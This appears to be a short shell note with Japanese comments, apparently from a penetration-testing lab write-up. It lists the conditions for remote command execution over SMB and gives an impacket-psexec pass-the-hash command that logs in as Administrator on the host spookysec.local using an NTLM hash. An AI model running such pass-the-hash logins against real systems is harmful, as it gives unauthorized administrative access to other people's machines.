```sh
# 使用条件
# ユーザがリモートホストでAdministratorsに属してること
# ADMINS$がsmbで共有されていること
# ファイルとプリンタの共有がオンになっていること
impacket-psexec Administrator:@spookysec.local -hashes 0e363213e37b94221497260b0bcb4fc
```